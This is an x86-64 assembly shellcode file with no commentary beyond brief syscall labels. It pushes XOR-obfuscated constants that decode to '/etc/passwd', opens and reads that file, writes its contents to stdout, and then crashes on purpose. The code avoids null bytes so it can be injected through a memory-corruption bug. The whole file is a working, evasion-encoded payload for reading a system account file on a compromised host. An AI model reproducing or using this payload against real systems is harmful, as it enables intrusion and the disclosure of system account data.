BITS 64

global _start

section .text

_start:
  xor r12,r12
  mov rbx, 0x2323232323475450
  push rbx
  mov rbx, 0x5042530c4057460c
  push rbx
  mov rdi,rsp

  ; syscall open file
  mov rbx, 0x2323232323232323
  xor [rdi], rbx
  xor dword [rdi + 8], 0x23232323
  mov rax, r12
  inc al
  inc al 
  mov rsi, r12 ; set O_RDONLY flag
  syscall
  
  ; syscall read file
  lea rsi, [rsp - 0xfff]
  mov rdi, rax
  mov rdx, r12 
  or dx, 0xfff; size to read
  mov rax, r12
  syscall
  
  ; syscall write to stdout
  mov rdi, r12
  inc dil; set stdout fd = 1
  mov rdx, rax
  mov rax, r12
  inc al 
  syscall
  
  ; crash
  jmp r12
